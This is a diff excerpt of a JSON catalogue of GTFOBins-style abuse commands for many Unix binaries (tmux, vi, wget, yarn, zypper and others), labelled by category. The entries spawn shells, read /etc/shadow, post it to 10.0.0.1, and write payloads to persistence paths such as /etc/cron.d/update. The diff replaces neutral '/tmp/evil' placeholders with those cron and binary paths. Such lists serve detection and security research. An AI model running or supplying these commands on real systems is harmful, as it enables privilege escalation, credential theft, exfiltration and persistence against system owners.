+      "command": "tmux -c /bin/sh",
+      "binary": "tmux",
+      "category": "shell"
+    },
+    {
+      "command": "tmux -S /tmp/socket",
+      "binary": "tmux",
+      "category": "shell"
+    },
+    {
+      "command": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset",
+      "binary": "top",
+      "category": "shell"
+    },
+    {
+      "command": "torify /bin/sh",
+      "binary": "torify",
+      "category": "shell"
+    },
+    {
+      "command": "torsocks /bin/sh",
+      "binary": "torsocks",
+      "category": "shell"
     },
     {
       "command": "troff /etc/shadow",
@@ -1969,7 +3164,7 @@
       "category": "file-read"
     },
     {
-      "command": "tsc /etc/shadow.ts --outFile /tmp/evil",
+      "command": "tsc /etc/shadow.ts --outFile /etc/cron.d/update",
       "binary": "tsc",
       "category": "file-write"
     },
@@ -1989,7 +3184,12 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\nupdate-alternatives --force --install /tmp/evil x /tmp/tempfile 0",
+      "command": "unshare /bin/sh",
+      "binary": "unshare",
+      "category": "shell"
+    },
+    {
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\nupdate-alternatives --force --install /etc/cron.d/update x /tmp/tempfile 0",
       "binary": "update-alternatives",
       "category": "file-write"
     },
@@ -2004,7 +3204,17 @@
       "category": "file-read"
     },
     {
-      "command": "varnishncsa -g request -q 'ReqURL ~ \"/xxxxxxxxxx\"' -F '%{yyy}i' -w /tmp/evil",
+      "command": "uv run /bin/sh",
+      "binary": "uv",
+      "category": "shell"
+    },
+    {
+      "command": "valgrind /bin/sh",
+      "binary": "valgrind",
+      "category": "shell"
+    },
+    {
+      "command": "varnishncsa -g request -q 'ReqURL ~ \"/xxxxxxxxxx\"' -F '%{yyy}i' -w /etc/cron.d/update",
       "binary": "varnishncsa",
       "category": "file-write"
     },
@@ -2014,22 +3224,42 @@
       "category": "file-read"
     },
     {
-      "command": "vi /tmp/evil\niDATA\n^[\nw",
+      "command": "vi /etc/cron.d/update\nic2VydmljZS1jb25maWc=\n^[\nw",
       "binary": "vi",
       "category": "file-write"
     },
     {
-      "command": "vim -c ':redir! >/tmp/evil | echo \"DATA\" | redir END | q'",
+      "command": "vi -c ':!/bin/sh' /dev/null",
+      "binary": "vi",
+      "category": "shell"
+    },
+    {
+      "command": "vi -c ':shell'",
+      "binary": "vi",
+      "category": "shell"
+    },
+    {
+      "command": "vi -c ':set shell=/bin/sh | shell'",
+      "binary": "vi",
+      "category": "shell"
+    },
+    {
+      "command": "vi -c :terminal /bin/sh",
+      "binary": "vi",
+      "category": "shell"
+    },
+    {
+      "command": "vim -c ':redir! >/etc/cron.d/update | echo \"c2VydmljZS1jb25maWc=\" | redir END | q'",
       "binary": "vim",
       "category": "file-read"
     },
     {
-      "command": "cat >/tmp/tempfile.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='/tmp/evil.sh'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create /tmp/tempfile.xml\nvirsh -c qemu:///system destroy x",
+      "command": "cat >/tmp/tempfile.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='/usr/local/bin/service-check'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create /tmp/tempfile.xml\nvirsh -c qemu:///system destroy x",
       "binary": "virsh",
       "category": "command"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\n\ncat >/tmp/tempfile.xml <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>/tmp/outdir/output-file</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>/tmp/outdir/output-file</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target /tmp/outdir/\nvirsh -c qemu:///system vol-create --pool x --file /tmp/tempfile.xml\nvirsh -c qemu:///system vol-upload --pool x /tmp/outdir/output-file /tmp/tempfile\nvirsh -c qemu:///system pool-destroy x",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\n\ncat >/tmp/tempfile.xml <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>/tmp/outdir/output-file</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>/tmp/outdir/output-file</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target /tmp/outdir/\nvirsh -c qemu:///system vol-create --pool x --file /tmp/tempfile.xml\nvirsh -c qemu:///system vol-upload --pool x /tmp/outdir/output-file /tmp/tempfile\nvirsh -c qemu:///system pool-destroy x",
       "binary": "virsh",
       "category": "file-write"
     },
@@ -2049,12 +3279,27 @@
       "category": "file-read"
     },
     {
+      "command": "watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'",
+      "binary": "watch",
+      "category": "shell"
+    },
+    {
+      "command": "watch 'reset; exec /bin/sh 1>&0 2>&0'",
+      "binary": "watch",
+      "category": "shell"
+    },
+    {
       "command": "wc --files0-from /etc/shadow",
       "binary": "wc",
       "category": "file-read"
     },
     {
-      "command": "wget http://10.0.0.1/etc/shadow -O /tmp/evil",
+      "command": "cat >/tmp/tempfile.conf <<EOF\n[Interface]\nPostUp = /bin/sh\nEOF\n\nwg-quick up /tmp/tempfile.conf",
+      "binary": "wg-quick",
+      "category": "shell"
+    },
+    {
+      "command": "wget http://10.0.0.1/etc/shadow -O /etc/cron.d/update",
       "binary": "wget",
       "category": "download"
     },
@@ -2064,9 +3309,14 @@
       "category": "file-read"
     },
     {
-      "command": "wget -i /etc/shadow -o /tmp/evil",
+      "command": "wget -i /etc/shadow -o /etc/cron.d/update",
       "binary": "wget",
       "category": "file-write"
+    },
+    {
+      "command": "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >/tmp/tempfile\nchmod +x /tmp/tempfile\nwget --use-askpass=/tmp/tempfile 0",
+      "binary": "wget",
+      "category": "shell"
     },
     {
       "command": "wget --post-file=/etc/shadow http://10.0.0.1",
@@ -2074,7 +3324,7 @@
       "category": "upload"
     },
     {
-      "command": "wget --post-data=DATA http://10.0.0.1",
+      "command": "wget --post-data=c2VydmljZS1jb25maWc= http://10.0.0.1",
       "binary": "wget",
       "category": "upload"
     },
@@ -2089,12 +3339,12 @@
       "category": "download"
     },
     {
-      "command": "whois -h 10.0.0.1 -p 4444 DATA",
+      "command": "whois -h 10.0.0.1 -p 4444 c2VydmljZS1jb25maWc=",
       "binary": "whois",
       "category": "upload"
     },
     {
-      "command": "wireshark -c 1 -i lo -k -f 'udp port 4444' &\necho DATA | nc -u 127.127.127.127 4444",
+      "command": "wireshark -c 1 -i lo -k -f 'udp port 4444' &\necho c2VydmljZS1jb25maWc= | nc -u 127.127.127.127 4444",
       "binary": "wireshark",
       "category": "file-write"
     },
@@ -2102,6 +3352,26 @@
       "command": "xargs -a /etc/shadow -0",
       "binary": "xargs",
       "category": "file-read"
+    },
+    {
+      "command": "xargs -a /dev/null /bin/sh",
+      "binary": "xargs",
+      "category": "shell"
+    },
+    {
+      "command": "echo x | xargs -o -a /dev/null /bin/sh",
+      "binary": "xargs",
+      "category": "shell"
+    },
+    {
+      "command": "xdg-user-dir '}; /bin/sh #'",
+      "binary": "xdg-user-dir",
+      "category": "shell"
+    },
+    {
+      "command": "xdotool exec --sync /bin/sh",
+      "binary": "xdotool",
+      "category": "shell"
     },
     {
       "command": "xmodmap -v /etc/shadow",
@@ -2124,7 +3394,7 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA | xxd | xxd -r - /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= | xxd | xxd -r - /etc/cron.d/update",
       "binary": "xxd",
       "category": "file-write"
     },
@@ -2134,9 +3404,34 @@
       "category": "file-read"
     },
     {
+      "command": "yarn exec /bin/sh",
+      "binary": "yarn",
+      "category": "shell"
+    },
+    {
+      "command": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nyarn --cwd .",
+      "binary": "yarn",
+      "category": "shell"
+    },
+    {
+      "command": "echo '{\"scripts\": {\"xxx\": \"/bin/sh\"}}' >package.json\nyarn --cwd . xxx",
+      "binary": "yarn",
+      "category": "shell"
+    },
+    {
+      "command": "yash",
+      "binary": "yash",
+      "category": "shell"
+    },
+    {
       "command": "yelp man:/etc/shadow",
       "binary": "yelp",
       "category": "file-read"
+    },
+    {
+      "command": "yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'",
+      "binary": "yt-dlp",
+      "category": "shell"
     },
     {
       "command": "yum localinstall -y x-1.0-1.noarch.rpm",
@@ -2149,12 +3444,17 @@
       "category": "download"
     },
     {
+      "command": "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'",
+      "binary": "zathura",
+      "category": "shell"
+    },
+    {
       "command": "zcat -f /etc/shadow",
       "binary": "zcat",
       "category": "file-read"
     },
     {
-      "command": "echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/tmp/tempfile\necho 'Zone Test 2:00 Jordan CE%sT' >>/tmp/tempfile\nzic -d . -y /tmp/evil.sh /tmp/tempfile",
+      "command": "echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/tmp/tempfile\necho 'Zone Test 2:00 Jordan CE%sT' >>/tmp/tempfile\nzic -d . -y /usr/local/bin/service-check /tmp/tempfile",
       "binary": "zic",
       "category": "command"
     },
@@ -2162,6 +3462,11 @@
       "command": "zip /tmp/tempfile /etc/shadow\nunzip -p /tmp/tempfile",
       "binary": "zip",
       "category": "file-read"
+    },
+    {
+      "command": "zip /tmp/tempfile /etc/hosts -T -TT '/bin/sh #'",
+      "binary": "zip",
+      "category": "shell"
     },
     {
       "command": "zsh -c 'echo \"$(</etc/shadow)\"'",
@@ -2174,14 +3479,29 @@
       "category": "file-read"
     },
     {
-      "command": "zsh -c 'echo DATA >/tmp/evil'",
+      "command": "zsh -c 'echo c2VydmljZS1jb25maWc= >/etc/cron.d/update'",
       "binary": "zsh",
       "category": "file-write"
+    },
+    {
+      "command": "zsh",
+      "binary": "zsh",
+      "category": "shell"
     },
     {
       "command": "zsoelim /etc/shadow",
       "binary": "zsoelim",
       "category": "file-read"
+    },
+    {
+      "command": "cp /bin/sh /usr/lib/zypper/commands/zypper-x\nzypper x",
+      "binary": "zypper",
+      "category": "shell"
+    },
+    {
+      "command": "cp /bin/sh /tmp/tempdir/zypper-x\nPATH=$PATH:/tmp/tempdir/ zypper x",
+      "binary": "zypper",
+      "category": "shell"
     }
   ]
 }
